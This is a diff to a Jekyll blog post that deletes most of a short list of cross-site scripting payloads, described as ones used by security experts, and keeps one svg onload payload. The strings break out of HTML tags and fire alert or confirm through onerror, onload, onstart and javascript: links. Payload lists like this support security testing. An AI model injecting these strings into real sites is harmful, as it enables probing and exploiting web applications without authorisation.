@@ -6,11 +6,4 @@ categories: jekyll update
 ---
 
 
-Some of the great XSS payloads used by experts in security industry,
-
-'"></title></script><img src=x onerror=confirm(1)>
-<a href="javascript:{ js code here}"> POC </a>
-<xml:namespace prefix="t"><svg><style>&lt;img/src=x onerror=alert(document.domain)// </b> 
 “><svg/onload=alert(document.domain)>”@x.y
-<marquee onstart=alert(1)>
-'>"><svg/onload=alert()>
